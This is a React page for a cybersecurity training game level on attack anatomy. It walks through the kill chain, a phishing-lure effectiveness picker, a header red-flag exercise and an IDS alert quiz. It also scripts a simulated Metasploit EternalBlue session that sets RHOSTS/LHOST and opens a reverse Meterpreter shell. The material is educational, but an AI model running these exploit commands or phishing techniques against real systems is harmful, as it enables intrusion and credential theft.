import { Navigation } from "@/components/Navigation";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { useState } from "react";
import { Link } from "react-router-dom";
import { Home, ChevronLeft, ChevronRight, Terminal } from "lucide-react";

const Level2 = () => {
  const [activeTab, setActiveTab] = useState("killchain");
  const [selectedStage, setSelectedStage] = useState("recon");
  const [phishingConfig, setPhishingConfig] = useState({ sender: "", subject: "" });
  const [phishingResult, setPhishingResult] = useState("");
  const [exploitStep, setExploitStep] = useState(0);
  const [terminalOutput, setTerminalOutput] = useState(["msf6 > "]);
  const [idsChoice, setIdsChoice] = useState("");
  const [redFlags, setRedFlags] = useState<string[]>([]);

  const killChainStages = {
    recon: {
      title: "Reconnaissance",
      redTeam: "Gather information about the target through OSINT, scanning, and enumeration.",
      blueTeam: "Monitor for suspicious scanning activities and implement threat intelligence feeds."
    },
    delivery: {
      title: "Delivery",
      redTeam: "Send the weaponized payload via email, web, or USB to the target.",
      blueTeam: "Deploy email security, web filtering, and endpoint protection to block delivery."
    },
    exploit: {
      title: "Exploitation",
      redTeam: "Execute code on the victim's system by exploiting a vulnerability.",
      blueTeam: "Implement patch management, application whitelisting, and behavior monitoring."
    },
    install: {
      title: "Installation",
      redTeam: "Install malware or backdoors on the victim's system for persistence.",
      blueTeam: "Use endpoint detection, file integrity monitoring, and application control."
    },
    c2: {
      title: "Command & Control",
      redTeam: "Establish communication channel with the compromised system.",
      blueTeam: "Monitor network traffic, implement DNS filtering, and detect C2 communications."
    },
    action: {
      title: "Actions on Objectives",
      redTeam: "Achieve the ultimate goal: data theft, system damage, or lateral movement.",
      blueTeam: "Implement data loss prevention, network segmentation, and incident response."
    }
  };

  const exploitSteps = [
    "msf6 > search ms17-010",
    "msf6 > use exploit/windows/smb/ms17_010_eternalblue",
    "msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100",
    "msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50",
    "msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit",
    "[*] Started reverse TCP handler on 192.168.1.50:4444",
    "[*] Sending stage (175174 bytes) to 192.168.1.100",
    "[*] Meterpreter session 1 opened",
    "meterpreter > sysinfo",
    "Computer: VICTIM-PC\\nOS: Windows 7 (6.1 Build 7601)\\nExploit Complete!"
  ];

  const emailHeaders = [
    "From: IT-Support@yourcorp.com",
    "To: employee@yourcorp.com", 
    "Subject: URGENT: Password Reset Required",
    "Date: Mon, 23 Sep 2024 10:30:00 +0000",
    "Return-Path: <noreply@evil-domain.com>",
    "Received: from mail.evil-domain.com",
    "Message-ID: <suspicious123@evil-domain.com>",
    "Content-Type: text/html; charset=UTF-8"
  ];

  const flagLines = ["Return-Path: <noreply@evil-domain.com>", "Received: from mail.evil-domain.com", "Message-ID: <suspicious123@evil-domain.com>"];

  const analyzePhishing = () => {
    const score = (phishingConfig.sender === "IT-Support@yourcorp.com" ? 40 : 0) + 
                  (phishingConfig.subject === "URGENT: Password Reset Required" ? 60 : 0);
    
    if (score >= 80) {
      setPhishingResult("🎯 Highly effective! This looks legitimate and creates urgency.");
    } else if (score >= 40) {
      setPhishingResult("⚠️ Moderately effective. Some red flags may be noticed.");
    } else {
      setPhishingResult("❌ Low effectiveness. Too obviously suspicious.");
    }
  };

  const nextExploitStep = () => {
    if (exploitStep < exploitSteps.length - 1) {
      const newOutput = [...terminalOutput, exploitSteps[exploitStep]];
      setTerminalOutput(newOutput);
      setExploitStep(exploitStep + 1);
    }
  };

  const handleEmailClick = (line: string) => {
    if (flagLines.includes(line) && !redFlags.includes(line)) {
      setRedFlags([...redFlags, line]);
    }
  };

  const handleIdsChoice = (choice: string) => {
    setIdsChoice(choice);
  };

  return (
    <div className="min-h-screen bg-background">
      <Navigation />
      
      <main className="pt-24 px-4">
        <div className="container mx-auto max-w-4xl">
          {/* Header */}
          <div className="text-center mb-8">
            <h1 className="text-4xl font-bold mb-4 cyber-gradient">
              Level 2: The Anatomy of an Attack
            </h1>
            <p className="text-xl text-muted-foreground">
              Follow the path of a real-world cyberattack, from initial recon to final objective.
            </p>
          </div>

          {/* Tab Navigation */}
          <div className="sticky top-20 z-40 glass border border-border/50 rounded-lg p-1 mb-8">
            <div className="flex space-x-1">
              {[
                { id: "killchain", label: "1. The Kill Chain" },
                { id: "offensive", label: "2. Offensive Ops" },
                { id: "defensive", label: "3. Defensive Ops" }
              ].map((tab) => (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id)}
                  className={`flex-1 px-4 py-2 rounded-md font-medium transition-all ${
                    activeTab === tab.id 
                      ? 'bg-primary text-primary-foreground' 
                      : 'text-muted-foreground hover:text-foreground'
                  }`}
                >
                  {tab.label}
                </button>
              ))}
            </div>
          </div>

          {/* Tab Content */}
          <div className="space-y-8 mb-16">
            {activeTab === "killchain" && (
              <div className="space-y-8">
                <Card className="glass">
                  <CardHeader>
                    <CardTitle className="text-blue-400">The Cyber Kill Chain</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <p className="text-muted-foreground mb-6">
                      The Cyber Kill Chain is a framework that describes the stages of a cyberattack, 
                      from initial reconnaissance to achieving the attacker's objectives.
                    </p>
                    
                    <div className="grid grid-cols-2 md:grid-cols-3 gap-4 mb-6">
                      {Object.entries(killChainStages).map(([key, stage]) => (
                        <button
                          key={key}
                          onClick={() => setSelectedStage(key)}
                          className={`p-4 rounded-lg border transition-all hover-lift ${
                            selectedStage === key 
                              ? 'border-primary bg-primary/10' 
                              : 'border-border glass'
                          }`}
                        >
                          <div className="text-sm font-medium">{stage.title}</div>
                        </button>
                      ))}
                    </div>
                    
                    <Card className="glass">
                      <CardHeader>
                        <CardTitle className="text-lg">
                          {killChainStages[selectedStage as keyof typeof killChainStages].title}
                        </CardTitle>
                      </CardHeader>
                      <CardContent className="space-y-4">
                        <div>
                          <h4 className="font-semibold text-red-400 mb-2">Red Team:</h4>
                          <p className="text-sm text-muted-foreground">
                            {killChainStages[selectedStage as keyof typeof killChainStages].redTeam}
                          </p>
                        </div>
                        <div>
                          <h4 className="font-semibold text-blue-400 mb-2">Blue Team:</h4>
                          <p className="text-sm text-muted-foreground">
                            {killChainStages[selectedStage as keyof typeof killChainStages].blueTeam}
                          </p>
                        </div>
                      </CardContent>
                    </Card>
                  </CardContent>
                </Card>
              </div>
            )}

            {activeTab === "offensive" && (
              <div className="space-y-8">
                <Card className="glass border-red-500/30">
                  <CardHeader>
                    <CardTitle className="text-red-400">Offensive Ops: Gaining Access</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <p className="text-muted-foreground">
                      Learn how attackers craft their initial attack vectors and exploit vulnerabilities 
                      to gain a foothold in target systems.
                    </p>
                  </CardContent>
                </Card>

                {/* Phishing Email Craft */}
                <Card className="glass">
                  <CardHeader>
                    <CardTitle>Crafting a Phishing Email</CardTitle>
                    <CardDescription>Choose the components to create an effective phishing attack</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div className="grid md:grid-cols-2 gap-4">
                      <div>
                        <label className="block text-sm font-medium mb-2">Sender Address:</label>
                        <select 
                          className="w-full p-2 rounded bg-input border border-border"
                          value={phishingConfig.sender}
                          onChange={(e) => setPhishingConfig({...phishingConfig, sender: e.target.value})}
                        >
                          <option value="">Select sender...</option>
                          <option value="hacker@evil.com">hacker@evil.com</option>
                          <option value="IT-Support@yourcorp.com">IT-Support@yourcorp.com</option>
                        </select>
                      </div>
                      
                      <div>
                        <label className="block text-sm font-medium mb-2">Subject Line:</label>
                        <select 
                          className="w-full p-2 rounded bg-input border border-border"
                          value={phishingConfig.subject}
                          onChange={(e) => setPhishingConfig({...phishingConfig, subject: e.target.value})}
                        >
                          <option value="">Select subject...</option>
                          <option value="check out this funny cat video">check out this funny cat video</option>
                          <option value="URGENT: Password Reset Required">URGENT: Password Reset Required</option>
                        </select>
                      </div>
                    </div>
                    
                    <Button 
                      onClick={analyzePhishing}
                      variant="destructive"
                      disabled={!phishingConfig.sender || !phishingConfig.subject}
                    >
                      Analyze Effectiveness
                    </Button>
                    
                    {phishingResult && (
                      <div className="p-4 glass rounded-lg">
                        <p className="font-medium">{phishingResult}</p>
                      </div>
                    )}
                  </CardContent>
                </Card>

                {/* Exploit Simulation */}
                <Card className="glass">
                  <CardHeader>
                    <CardTitle>Exploiting a Vulnerability</CardTitle>
                    <CardDescription>Step through a Metasploit attack simulation</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div className="terminal p-4 rounded-lg font-mono text-sm max-h-64 overflow-y-auto">
                      {terminalOutput.map((line, index) => (
                        <div key={index} className="whitespace-pre-line">{line}</div>
                      ))}
                    </div>
                    
                    <Button 
                      onClick={nextExploitStep}
                      variant="cyber"
                      disabled={exploitStep >= exploitSteps.length - 1}
                      className="flex items-center gap-2"
                    >
                      <Terminal className="w-4 h-4" />
                      {exploitStep >= exploitSteps.length - 1 ? "Exploit Complete" : "Next Step"}
                    </Button>
                  </CardContent>
                </Card>
              </div>
            )}

            {activeTab === "defensive" && (
              <div className="space-y-8">
                <Card className="glass border-blue-500/30">
                  <CardHeader>
                    <CardTitle className="text-blue-400">Defensive Ops: Sounding the Alarm</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <p className="text-muted-foreground">
                      Learn how defenders detect and respond to the attack techniques 
                      used by offensive security teams.
                    </p>
                  </CardContent>
                </Card>

                {/* Email Header Analysis */}
                <Card className="glass">
                  <CardHeader>
                    <CardTitle>Spot the Phishing Red Flags</CardTitle>
                    <CardDescription>Click on suspicious email headers to identify red flags</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div className="terminal p-4 rounded-lg space-y-1">
                      {emailHeaders.map((header, index) => (
                        <div
                          key={index}
                          onClick={() => handleEmailClick(header)}
                          className={`cursor-pointer hover:bg-white/10 p-1 rounded transition-colors ${
                            redFlags.includes(header) ? 'bg-red-500/20 text-red-400' : ''
                          }`}
                        >
                          {header}
                        </div>
                      ))}
                    </div>
                    
                    {redFlags.length > 0 && (
                      <div className="space-y-2">
                        <h4 className="font-semibold text-red-400">Red Flags Identified:</h4>
                        <ul className="space-y-1 text-sm">
                          {redFlags.map((flag, index) => (
                            <li key={index} className="text-red-400">• {flag}</li>
                          ))}
                        </ul>
                      </div>
                    )}
                    
                    {redFlags.length === flagLines.length && (
                      <div className="p-4 bg-green-500/10 border border-green-500/30 rounded-lg">
                        <p className="text-green-400 font-semibold">🎉 All red flags identified!</p>
                      </div>
                    )}
                  </CardContent>
                </Card>

                {/* IDS Alert Response */}
                <Card className="glass">
                  <CardHeader>
                    <CardTitle>Intrusion Detection System (IDS) Alert</CardTitle>
                    <CardDescription>Choose the appropriate response to this security alert</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div className="p-4 border-2 border-red-500 bg-red-500/10 rounded-lg">
                      <div className="flex items-center gap-2 mb-2">
                        <Badge className="bg-red-500">HIGH PRIORITY</Badge>
                        <span className="font-semibold">Exploit Attempt Detected</span>
                      </div>
                      <p className="text-sm text-muted-foreground">
                        <strong>Source IP:</strong> 203.0.113.42<br />
                        <strong>Target:</strong> 192.168.1.100:445<br />
                        <strong>Signature:</strong> MS17-010 EternalBlue SMB Exploit<br />
                        <strong>Severity:</strong> Critical
                      </p>
                    </div>
                    
                    <div className="grid gap-3">
                      {[
                        { id: "ignore", text: "Ignore Alert", result: "❌ Dangerous! Ignoring critical alerts allows attacks to succeed." },
                        { id: "ticket", text: "Create Ticket", result: "⚠️ Better than ignoring, but too slow for critical threats." },
                        { id: "block", text: "Block IP & Isolate Host", result: "✅ Correct! Immediate action prevents further damage." }
                      ].map((choice) => (
                        <Button
                          key={choice.id}
                          onClick={() => handleIdsChoice(choice.id)}
                          variant={choice.id === "block" ? "cyber" : "cyber-ghost"}
                          disabled={!!idsChoice}
                          className="justify-start"
                        >
                          {choice.text}
                        </Button>
                      ))}
                    </div>
                    
                    {idsChoice && (
                      <div className="p-4 glass rounded-lg">
                        <p className="text-sm">
                          {[
                            { id: "ignore", result: "❌ Dangerous! Ignoring critical alerts allows attacks to succeed." },
                            { id: "ticket", result: "⚠️ Better than ignoring, but too slow for critical threats." },
                            { id: "block", result: "✅ Correct! Immediate action prevents further damage." }
                          ].find(c => c.id === idsChoice)?.result}
                        </p>
                      </div>
                    )}
                  </CardContent>
                </Card>
              </div>
            )}
          </div>

          {/* Navigation Buttons */}
          <div className="flex justify-between items-center py-8">
            <Button asChild variant="cyber-ghost" size="lg">
              <Link to="/level/1" className="flex items-center gap-2">
                <ChevronLeft className="w-4 h-4" />
                Previous
              </Link>
            </Button>
            
            <Button asChild variant="cyber-ghost" size="lg">
              <Link to="/" className="flex items-center gap-2">
                <Home className="w-4 h-4" />
                Home
              </Link>
            </Button>
            
            <Button asChild variant="cyber" size="lg">
              <Link to="/level/3" className="flex items-center gap-2">
                Next
                <ChevronRight className="w-4 h-4" />
              </Link>
            </Button>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Level2;